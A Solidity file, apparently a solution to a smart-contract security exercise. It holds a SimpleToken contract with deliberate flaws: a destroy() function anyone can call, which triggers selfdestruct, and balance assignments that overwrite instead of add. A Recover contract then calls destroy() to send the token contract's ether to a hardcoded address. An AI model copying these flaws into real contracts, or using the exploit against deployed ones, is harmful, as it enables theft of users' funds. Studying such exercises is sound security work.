// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract SimpleToken {
	using SafeMath for uint256;
	// public variables
	string public name;
	mapping(address => uint256) public balances;

	// constructor
	constructor(
		string memory _name,
		address _creator,
		uint256 _initialSupply
	) {
		name = _name;
		balances[_creator] = _initialSupply;
	}

	// collect ether in return for tokens
	receive() external payable {
		balances[msg.sender] = msg.value.mul(10);
	}

	// allow transfers of tokens
	function transfer(address _to, uint256 _amount) public {
		require(balances[msg.sender] >= _amount);
		balances[msg.sender] = balances[msg.sender].sub(_amount);
		balances[_to] = _amount;
	}

	// clean up after ourselves
	function destroy(address payable _to) public {
		selfdestruct(_to);
	}
}

contract Recover {
	SimpleToken st;

	constructor(address payable stAddress) {
		st = SimpleToken(stAddress);
	}

	function recover() public {
		st.destroy(payable(address(0xBf639FfACbb1B4D597ae22efefe33d5D86fAD6c9)));
	}
}
